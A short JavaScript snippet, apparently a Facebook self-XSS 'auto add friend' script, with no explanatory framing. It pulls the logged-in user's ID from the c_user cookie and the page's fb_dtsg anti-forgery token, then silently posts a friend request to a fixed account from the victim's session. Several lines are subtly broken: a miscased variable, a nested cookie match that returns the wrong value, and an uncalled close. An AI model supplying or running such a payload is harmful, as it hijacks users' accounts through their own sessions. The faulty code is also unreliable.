var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php?dpr=1";
  var XParams = "to_friend=100003085666469&action=add_friend&how_found=profile_browser&ref_param=pb_reactions&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer&floc=list_of_people&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
  X.open("POST", XURL, true);
  x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
